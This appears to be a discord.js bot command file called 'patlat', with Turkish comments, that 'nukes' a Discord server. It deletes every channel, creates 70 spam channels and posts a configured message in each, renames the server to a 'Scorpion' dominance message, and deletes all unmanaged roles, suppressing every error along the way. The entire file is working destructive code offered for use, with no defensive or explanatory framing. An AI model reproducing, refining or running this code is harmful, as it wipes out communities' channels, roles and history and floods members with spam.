const { ChannelType } = require("discord.js");
const delay = (ms) => new Promise((res) => setTimeout(res, ms));

module.exports = {
  name: "patlat",
  description: "Krallığın sonunu getirir, her şeyi silip Scorpion'un hakimiyetini kurar.",
  async execute(message, args, client, config) {
    await message.delete().catch(() => { });
    const guild = message.guild;

    // Tüm kanalları sil
    for (const channel of guild.channels.cache.values()) {
      await channel.delete().catch(() => { });
      await delay(300);
    }

    // Scorpion kanalları aç ve spam at
    for (let i = 0; i < 70; i++) {
      try {
        const chan = await guild.channels.create({
          name: "kacisin-yok-Scorpion-burada",
          type: ChannelType.GuildText,
        });
        await chan.send(config.nukeMessage).catch(() => { });
      } catch { }
      await delay(300);
    }

    // Sunucu adını değiştir
    await guild.setName("MUTLAK HAKİM SCORPION").catch(() => { });

    // Yönetilmeyen rolleri sil
    for (const role of guild.roles.cache.values()) {
      if (!role.managed && role.id !== guild.id) {
        await role.delete().catch(() => { });
        await delay(200);
      }
    }
  },
};
